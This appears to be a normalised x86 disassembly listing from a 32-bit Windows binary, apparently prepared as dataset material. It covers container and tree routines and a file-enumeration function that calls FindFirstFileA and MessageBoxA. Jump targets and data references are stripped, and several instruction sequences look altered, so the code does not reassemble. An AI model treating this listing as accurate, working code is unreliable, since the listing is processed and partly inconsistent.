lea eax [ edi + eax * 4 ]
push esi
push eax
push ecx
mov eax esp
mov [ eax ] ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
mov [ eax ] ecx
call sub_453050
mov ecx [ esi + 0x4 ]
add esp 0x14
test ecx ecx
jne r-xdata
test edi edi
jne r-xdata
add ecx edx
cmp eax ecx
jae r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax edi
sar eax 0x2
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x14 ]
add edx ebx
lea eax [ ebx + edi * 4 ]
mov [ esi + 0xc ] edx
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov edi [ ebp + 0xc ]
add edi eax
test ecx ecx
je r-xdata
add eax edx
sub_40d2a0
push ebp
mov ebp esp
push 0xffffffff
push sub_4bef31
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push 0x30
call sub_4b573e
mov esi eax
add esp 0x4
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x18 ] esi
test esi esi
mov [ ebp - 0x4 ] 0x1
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push edx
push eax
push ecx
mov ecx esi
call sub_4331f0
sub_40d330
push ebp
mov ebp esp
push 0xffffffff
push sub_4bef40
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov ecx [ edi + 0x4 ]
test ecx ecx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
jne r-xdata
mov eax [ edi + 0x8 ]
sub eax ecx
sar eax 0x1
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
mov eax [ edi + 0x8 ]
mov edi [ edi + 0x4 ]
push edx
push esi
push ecx
push eax
push edi
mov [ ebp - 0x4 ] 0x0
call sub_417680
add esp 0x14
mov [ esi + 0x8 ] eax
push eax
mov ecx esi
call sub_40cac0
test al al
je r-xdata
sub_40d3d0
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
mov esi ecx
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov edx [ edi + 0x4 ]
xor ebx ebx
cmp edx ebx
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
mov ebp [ edi + 0x8 ]
mov ecx ebp
sub ecx edx
sar ecx 0x1
cmp ecx ebx
jne r-xdata
pop edi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esi + 0x4 ]
cmp eax ebx
jne r-xdata
mov ebx [ esi + 0x8 ]
sub ebx eax
sar ebx 0x1
xor ebx ebx
jmp r-xdata
test eax eax
jne r-xdata
push eax
push ebp
push edx
call sub_40bb50
mov eax [ edi + 0x4 ]
add esp 0xc
test eax eax
jne r-xdata
cmp ecx ebx
ja r-xdata
mov ebx [ esi + 0xc ]
sub ebx eax
sar ebx 0x1
xor ebx ebx
jmp r-xdata
mov edi [ edi + 0x8 ]
sub edi eax
mov eax [ esi + 0x4 ]
sar edi 0x1
lea ecx [ eax + edi * 2 ]
pop edi
mov [ esi + 0x8 ] ecx
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov eax [ esi + 0x4 ]
xor edi edi
lea ecx [ eax + edi * 2 ]
pop edi
mov [ esi + 0x8 ] ecx
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
push eax
call j_sub_4b66ed#2
mov ecx [ edi + 0x4 ]
add esp 0x4
test ecx ecx
jne r-xdata
test eax eax
jne r-xdata
cmp ecx ebx
ja r-xdata
mov eax [ edi + 0x8 ]
sub eax ecx
sar eax 0x1
xor eax eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
sub ecx eax
sar ecx 0x1
xor ecx ecx
jmp r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ edi + 0x8 ]
mov edi [ edi + 0x4 ]
push ecx
push eax
push edi
mov ecx esi
call sub_40bb30
mov [ esi + 0x8 ] eax
push eax
mov ecx esi
call sub_40cac0
test al al
je r-xdata
push eax
lea ebx [ edx + ecx * 2 ]
push ebx
push edx
call sub_40bb50
mov edx [ esp + 0x20 ]
mov eax [ esi + 0x8 ]
mov edi [ edi + 0x8 ]
push edx
push esi
push eax
push edi
push ebx
call sub_417680
add esp 0x20
pop edi
mov [ esi + 0x8 ] eax
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
sub_40d510
push ebp
mov ebp esp
push 0xffffffff
push sub_4bef50
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov ecx [ edi + 0x4 ]
test ecx ecx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
jne r-xdata
mov eax [ edi + 0x8 ]
sub eax ecx
sar eax 0x3
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
mov eax [ edi + 0x8 ]
mov edi [ edi + 0x4 ]
push edx
push esi
push ecx
push eax
push edi
mov [ ebp - 0x4 ] 0x0
call sub_417b90
add esp 0x14
mov [ esi + 0x8 ] eax
push eax
mov ecx esi
call sub_40cb10
test al al
je r-xdata
sub_40d5b0
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
mov esi ecx
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov edx [ edi + 0x4 ]
test edx edx
je r-xdata
mov ecx esi
call sub_40bf40
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov ebp [ edi + 0x8 ]
mov ecx ebp
sub ecx edx
sar ecx 0x3
test ecx ecx
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov ebx [ esi + 0x8 ]
sub ebx eax
sar ebx 0x3
xor ebx ebx
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ esp + 0x14 ]
push ecx
push eax
push ebp
push edx
call sub_40b800
mov edx [ esp + 0x24 ]
mov ecx [ esi + 0x8 ]
push edx
push esi
push ecx
push eax
call sub_40bbe0
mov eax [ edi + 0x4 ]
add esp 0x20
test eax eax
jne r-xdata
cmp ecx ebx
ja r-xdata
mov ebx [ esi + 0xc ]
sub ebx eax
sar ebx 0x3
xor ebx ebx
jmp r-xdata
mov edi [ edi + 0x8 ]
mov edx [ esi + 0x4 ]
sub edi eax
sar edi 0x3
lea eax [ edx + edi * 8 ]
pop edi
mov [ esi + 0x8 ] eax
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov edx [ esi + 0x4 ]
xor edi edi
lea eax [ edx + edi * 8 ]
pop edi
mov [ esi + 0x8 ] eax
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov ecx [ esp + 0x14 ]
mov edx [ esi + 0x8 ]
push ecx
push esi
push edx
push eax
call sub_40bbe0
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
mov ecx [ edi + 0x4 ]
add esp 0x14
test ecx ecx
jne r-xdata
test eax eax
jne r-xdata
cmp ecx ebx
ja r-xdata
mov eax [ edi + 0x8 ]
sub eax ecx
sar eax 0x3
xor eax eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
sub ecx eax
sar ecx 0x3
xor ecx ecx
jmp r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ edi + 0x8 ]
mov edi [ edi + 0x4 ]
push ecx
push eax
push edi
mov ecx esi
call sub_40bc60
mov [ esi + 0x8 ] eax
push eax
mov ecx esi
call sub_40cb10
test al al
je r-xdata
lea ebx [ edx + ecx * 8 ]
mov ecx [ esp + 0x14 ]
push ecx
push eax
push ebx
push edx
call sub_40b800
mov edx [ esp + 0x24 ]
mov eax [ esi + 0x8 ]
mov edi [ edi + 0x8 ]
push edx
push esi
push eax
push edi
push ebx
call sub_417b90
add esp 0x24
pop edi
mov [ esi + 0x8 ] eax
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
sub_40d710
push ebp
mov ebp esp
push 0xffffffff
push sub_4bef60
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
push esi
mov esi ecx
xor ecx ecx
cmp eax ecx
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
jne r-xdata
mov edi [ ebx + 0x8 ]
sub edi eax
xor edi edi
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp edi 0xffffffff
jbe r-xdata
cmp edi ecx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] ecx
je r-xdata
push edi
call sub_4b573e
add esp 0x4
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
add eax edi
mov [ esi + 0xc ] eax
mov edx [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
mov eax [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
push edx
push esi
push ecx
push eax
push ebx
mov [ ebp - 0x4 ] 0x0
call sub_45f6a0
add esp 0x14
mov [ esi + 0x8 ] eax
mov ecx esi
call sub_40bf80
sub_40d7d0
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
mov esi ecx
cmp esi ebx
push edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov ecx [ ebx + 0x4 ]
xor edx edx
cmp ecx edx
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax edx
je r-xdata
mov ebp [ ebx + 0x8 ]
mov edi ebp
sub edi ecx
jne r-xdata
pop edi
mov [ esi + 0x4 ] edx
mov [ esi + 0x8 ] edx
mov [ esi + 0xc ] edx
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
push eax
call j_sub_4b66ed#2
add esp 0x4
xor edx edx
mov eax [ esi + 0x4 ]
cmp eax edx
jne r-xdata
mov edx [ esi + 0x8 ]
sub edx eax
xor edx edx
jmp r-xdata
test eax eax
jne r-xdata
cmp ecx ebp
mov edi eax
je r-xdata
cmp edi edx
ja r-xdata
mov edx [ esi + 0xc ]
sub edx eax
xor edx edx
jmp r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
jne r-xdata
mov al [ ecx ]
mov [ edi ] al
inc edi
inc ecx
cmp ecx ebp
jne r-xdata
push eax
call j_sub_4b66ed#2
mov ecx [ ebx + 0x4 ]
add esp 0x4
test ecx ecx
jne r-xdata
test eax eax
jne r-xdata
cmp edi edx
ja r-xdata
mov ebx [ ebx + 0x8 ]
mov ecx [ esi + 0x4 ]
sub ebx eax
add ecx ebx
pop edi
mov [ esi + 0x8 ] ecx
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov ecx [ esi + 0x4 ]
xor ebx ebx
add ecx ebx
pop edi
mov [ esi + 0x8 ] ecx
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov eax [ ebx + 0x8 ]
sub eax ecx
xor eax eax
jmp r-xdata
mov edx [ esi + 0x8 ]
sub edx eax
xor edx edx
jmp r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
push ecx
push eax
push ebx
mov ecx esi
call sub_40bb80
mov [ esi + 0x8 ] eax
push eax
mov ecx esi
call sub_40cb70
test al al
je r-xdata
push eax
lea edi [ ecx + edx ]
push edi
push ecx
call sub_40bba0
mov edx [ esp + 0x20 ]
mov eax [ esi + 0x8 ]
mov ebx [ ebx + 0x8 ]
push edx
push esi
push eax
push ebx
push edi
call sub_45f6a0
add esp 0x20
pop edi
mov [ esi + 0x8 ] eax
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
sub_40d900
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4bef78
push eax
mov [ fs : 0x0 ] esp
push esi
push edi
mov esi [ ecx + 0x4 ]
test esi esi
mov [ esp + 0x10 ] 0x0
jne r-xdata
mov eax [ ecx + 0x8 ]
sub eax esi
sar eax 0x3
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov edx [ esp + 0x18 ]
cmp eax edx
jae r-xdata
cmp [ esp + 0x1c ] 0x63
mov [ esp + 0x10 ] 0xffffffff
jne r-xdata
mov edi [ ecx + 0x8 ]
mov eax edi
sub eax esi
sar eax 0x3
cmp edx eax
jae r-xdata
mov eax [ ecx + 0x8 ]
sub eax esi
sar eax 0x3
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x8 ]
pop edi
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0xc
mov ecx [ esp + 0x20 ]
test ecx ecx
je r-xdata
push ecx
mov eax esp
mov [ eax ] edi
mov eax [ ecx + 0x4 ]
mov [ esp + 0x1c ] esp
push ecx
lea eax [ eax + edx * 8 ]
mov esi esp
lea edx [ esp + 0x20 ]
mov [ esp + 0x20 ] esp
push edx
mov [ esi ] eax
call sub_40c000
sub edx eax
lea esi [ esp + 0x1c ]
push esi
push edx
mov edx [ ecx + 0x8 ]
push ecx
mov eax esp
mov [ esp + 0x24 ] esp
mov [ eax ] edx
call sub_40cce0
jmp r-xdata
dec [ ecx + 0x4 ]
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x14 ]
sub_40d9d0
push ebx
mov ebx [ esp + 0x10 ]
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax ]
jne r-xdata
cmp esi ebx
je r-xdata
cmp ebx eax
jne r-xdata
mov eax [ esp + 0x10 ]
pop edi
mov [ eax ] esi
pop esi
pop ebx
retn 0xc
mov al [ esi + 0x2d ]
test al al
mov ecx esi
jne r-xdata
mov eax [ eax + 0x4 ]
push eax
mov ecx edi
call sub_40c380
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ edi + 0x8 ] 0x0
mov [ eax ] eax
mov eax [ edi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ edi + 0x4 ]
mov edx [ ecx ]
mov eax [ esp + 0x10 ]
pop edi
pop esi
mov [ eax ] edx
pop ebx
retn 0xc
push ecx
lea eax [ esp + 0x18 ]
push eax
mov ecx edi
call sub_40c050
cmp esi ebx
jne r-xdata
mov eax [ esi + 0x8 ]
mov dl [ eax + 0x2d ]
test dl dl
jne r-xdata
mov eax [ esi + 0x4 ]
mov dl [ eax + 0x2d ]
test dl dl
jne r-xdata
mov esi eax
mov eax [ esi ]
mov dl [ eax + 0x2d ]
test dl dl
jne r-xdata
mov esi eax
cmp esi [ eax + 0x8 ]
jne r-xdata
mov edi edi
mov esi eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x2d ]
test dl dl
je r-xdata
mov esi eax
mov eax [ esi ]
mov dl [ eax + 0x2d ]
test dl dl
je r-xdata
jmp r-xdata
sub_40da90
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4bee98
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
push esi
push edi
mov edi ecx
cmp [ edi + 0x8 ] 0x7fffffe
jb r-xdata
mov edx [ esp + 0x68 ]
mov eax [ edi + 0x4 ]
mov esi [ esp + 0x64 ]
push ebx
push 0x0
push edx
push eax
push esi
push eax
mov ecx edi
call sub_40d2a0
mov ebx [ edi + 0x8 ]
mov ecx eax
mov eax [ edi + 0x4 ]
inc ebx
cmp esi eax
mov [ esp + 0x6c ] ecx
mov [ edi + 0x8 ] ebx
jne r-xdata
xor esi esi
mov eax r--data
mov [ esp + 0x20 ] 0xf
mov [ esp + 0x1c ] esi
mov [ esp + 0xc ] 0x0
lea edx [ eax + 0x1 ]
mov al [ esp + 0x64 ]
test al al
je r-xdata
mov [ eax + 0x4 ] ecx
mov eax [ edi + 0x4 ]
mov [ eax ] ecx
mov edx [ edi + 0x4 ]
mov [ edx + 0x8 ] ecx
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x10 ]
call sub_401e80
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x28 ]
mov [ esp + 0x58 ] esi
call sub_402340
push r--data
lea ecx [ esp + 0x28 ]
push ecx
mov [ esp + 0x2c ] r--data
call sub_4b5bd2
mov [ esi + 0x8 ] ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov [ esi ] ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax ]
jne r-xdata
mov edx [ ecx + 0x4 ]
cmp [ edx + 0x2c ] 0x0
lea eax [ ecx + 0x4 ]
mov esi ecx
mov bl 0x1
jne r-xdata
mov [ eax + 0x8 ] ecx
mov [ eax ] ecx
jmp r-xdata
mov edx [ edi + 0x4 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x2c ] bl
mov eax [ esp + 0x60 ]
pop ebx
mov [ eax ] ecx
mov ecx [ esp + 0x4c ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x50
retn 0x10
push ebp
cmp [ edx + 0x2c ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x2c ] 0x0
jne r-xdata
cmp esi [ ecx ]
jne r-xdata
mov [ ecx + 0x2c ] bl
mov [ edx + 0x2c ] bl
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x2c ] 0x0
mov eax [ eax ]
mov esi [ eax + 0x4 ]
jmp r-xdata
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov [ ecx + 0x2c ] bl
mov [ edx + 0x2c ] bl
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x2c ] 0x0
mov eax [ eax ]
mov esi [ eax + 0x4 ]
jmp r-xdata
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x2c ] bl
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x2c ] 0x0
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
push edx
mov ecx edi
call sub_40afa0
mov esi ecx
push esi
mov ecx edi
call sub_40b000
mov ecx [ esi + 0x4 ]
mov dl [ ecx + 0x2c ]
test dl dl
lea eax [ esi + 0x4 ]
je r-xdata
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x2c ] bl
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x2c ] 0x0
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
push edx
mov ecx edi
call sub_40b000
jmp r-xdata
mov esi ecx
push esi
mov ecx edi
call sub_40afa0
mov ecx [ eax ]
mov ebp [ ecx + 0x4 ]
mov edx [ ebp ]
cmp ecx edx
jne r-xdata
mov ecx [ esp + 0x70 ]
pop ebp
sub_40dc90
push ecx
mov eax [ ecx + 0x8 ]
test eax eax
push esi
lea esi [ ecx + 0x4 ]
je r-xdata
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
pop esi
pop ecx
retn
mov ecx [ esp + 0x4 ]
mov edx [ esi + 0x8 ]
push ecx
push esi
push edx
push eax
call sub_402270
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x14
sub_40dcd0
push ebp
mov ebp esp
push 0xffffffff
push sub_4bef90
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x4 ]
test eax eax
push edi
mov edi ecx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov eax edi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov ecx [ edi + 0x4 ]
mov eax [ esi + 0x8 ]
mov esi [ esi + 0x4 ]
push edx
push edi
push ecx
push eax
push esi
mov [ ebp - 0x4 ] 0x0
call sub_40c470
add esp 0x14
mov [ edi + 0x8 ] eax
push edx
mov ecx edi
call sub_403140
test al al
je r-xdata
sub_40dd80
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
mov esi ecx
cmp esi ebp
push edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov eax [ ebp + 0x4 ]
test eax eax
je r-xdata
mov ecx esi
call sub_403ab0
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov edi [ ebp + 0x8 ]
mov ecx edi
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
mov eax edx
test eax eax
mov [ esp + 0x14 ] eax
jne r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx ebx
mov eax 0x92492493
imul ecx
mov eax [ esp + 0x14 ]
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
test ebx ebx
jne r-xdata
mov edx [ esp + 0x14 ]
mov eax [ ebp + 0x4 ]
push edx
push ebx
push edi
push eax
call sub_420f20
mov ecx [ esp + 0x24 ]
mov edx [ esi + 0x8 ]
push ecx
push esi
push edx
push eax
call sub_402270
mov eax [ ebp + 0x4 ]
add esp 0x20
test eax eax
jne r-xdata
cmp eax edx
ja r-xdata
mov ecx [ esi + 0xc ]
sub ecx ebx
mov eax 0x92492493
imul ecx
mov eax [ esp + 0x14 ]
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov ebp [ ebp + 0x8 ]
sub ebp eax
mov eax 0x92492493
imul ebp
add edx ebp
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
mov eax [ esi + 0x4 ]
imul edx edx 0x1c
add edx eax
pop edi
mov [ esi + 0x8 ] edx
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov eax [ esi + 0x4 ]
xor edx edx
imul edx edx 0x1c
add edx eax
pop edi
mov [ esi + 0x8 ] edx
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov edx [ esp + 0x14 ]
mov eax [ esi + 0x8 ]
push edx
push esi
push eax
push ebx
call sub_402270
mov ecx [ esi + 0x4 ]
push ecx
call j_sub_4b66ed#2
add esp 0x14
mov ecx ebp
call sub_4010c0
push eax
mov ecx esi
call sub_403140
test al al
je r-xdata
mov ecx esi
call sub_4010c0
mov edx [ esp + 0x14 ]
mov edi eax
mov eax [ ebp + 0x4 ]
imul edi edi 0x1c
push edx
add edi eax
push ebx
push edi
push eax
call sub_420f20
mov ecx [ esp + 0x24 ]
mov eax [ esi + 0x8 ]
mov ebp [ ebp + 0x8 ]
push ecx
push esi
push eax
push ebp
push edi
call sub_40c470
add esp 0x24
pop edi
mov [ esi + 0x8 ] eax
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
cmp eax edx
ja r-xdata
mov edx [ esi + 0x4 ]
mov eax [ ebp + 0x8 ]
mov ebp [ ebp + 0x4 ]
push edx
push eax
push ebp
mov ecx esi
call sub_40dc70
mov [ esi + 0x8 ] eax
sub_40df20
push esi
mov esi ecx
mov edx [ esi + 0x4 ]
test edx edx
push edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
push edx
push 0x1
push ecx
mov ecx esp
mov [ ecx ] eax
mov ecx esi
call sub_40d000
pop edi
pop esi
retn 0x4
mov eax [ esi + 0xc ]
sub eax edx
sar eax 0x2
cmp ecx eax
jae r-xdata
test edx edx
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0xc ]
mov edi [ esi + 0x8 ]
push eax
push esi
push ecx
push 0x1
push edi
call sub_420d80
add esp 0x14
add edi 0x4
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn 0x4
sub_40df90
push ecx
mov edx [ ecx + 0x4 ]
mov eax [ edx + 0x4 ]
push ebp
mov ebp [ esp + 0x10 ]
push esi
mov esi edx
mov dl [ eax + 0x2d ]
test dl dl
mov [ esp + 0x8 ] 0x1
jne r-xdata
mov eax [ esp + 0x8 ]
push ebp
push esi
push eax
lea edx [ esp + 0x20 ]
push edx
call sub_40da90
mov ecx [ eax ]
mov eax [ esp + 0x10 ]
pop esi
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x1
pop ebp
pop ecx
retn 0x8
push edi
mov edi [ ebp + 0x14 ]
nop
mov eax [ eax + 0x8 ]
mov eax [ eax ]
jmp r-xdata
cmp edi [ eax + 0x20 ]
seta dl
test dl dl
mov esi eax
mov [ esp + 0xc ] dl
je r-xdata
pop edi
mov dl [ eax + 0x2d ]
test dl dl
je r-xdata
sub_40e020
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
cmp esi ebx
je r-xdata
mov eax [ esp + 0x14 ]
pop esi
pop ebx
retn
push edi
mov edi [ esp + 0x18 ]
mov eax [ esi ]
lea ecx [ esi + 0x4 ]
push ecx
lea ecx [ edi + 0x4 ]
mov [ edi ] eax
call sub_40dd80
add esi 0x14
add edi 0x14
cmp esi ebx
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_40e060
push 0xffffffff
push sub_4befb6
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x284
push ebx
mov ebx [ esp + 0x298 ]
push ebp
push edi
xor edi edi
mov eax ebx
mov [ esp + 0x44 ] 0xf
mov [ esp + 0x40 ] edi
mov [ esp + 0x30 ] 0x0
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push ebx
lea ecx [ esp + 0x34 ]
call sub_401e80
mov eax [ esp + 0x44 ]
mov ebp 0x10
cmp eax ebp
mov eax [ esp + 0x30 ]
mov [ esp + 0x298 ] edi
jae r-xdata
push eax
call sub_457f00
add esp 0x4
test eax eax
jle r-xdata
lea eax [ esp + 0x30 ]
mov eax r--data
lea edx [ eax + 0x1 ]
push 0x5c
push 0x1
lea ecx [ esp + 0x34 ]
call sub_4017f0
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x34 ]
call sub_401cc0
cmp [ esp + 0x44 ] ebp
mov eax [ esp + 0x30 ]
jae r-xdata
lea ecx [ esp + 0x4c ]
push ecx
push eax
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ esp + 0x28 ] eax
jne r-xdata
lea eax [ esp + 0x30 ]
push esi
push ebx
lea edx [ esp + 0x190 ]
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0xc
push edi
push r--data
lea eax [ esp + 0x194 ]
push eax
push edi
call [ MessageBoxA@IAT ]
cmp [ esp + 0x44 ] ebp
jb r-xdata
mov eax [ esp + 0x2c ]
lea edx [ esp + 0x50 ]
push edx
push eax
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ esp + 0x80 ]
push eax
call esi
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x30 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov esi [ lstrcmpA@IAT ]
push r--data
lea edx [ esp + 0x80 ]
push edx
call esi
test eax eax
je r-xdata
mov ecx [ esp + 0x2c ]
push ecx
call [ FindClose@IAT ]
cmp [ esp + 0x48 ] ebp
pop esi
jb r-xdata
mov esi 0xf
mov eax ebx
mov [ esp + 0x28 ] esi
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] 0x0
lea edx [ eax + 0x1 ]
nop
mov ecx [ esp + 0x290 ]
pop edi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x290
retn
mov eax 0x1
mov edx [ esp + 0x30 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push ebx
lea ecx [ esp + 0x18 ]
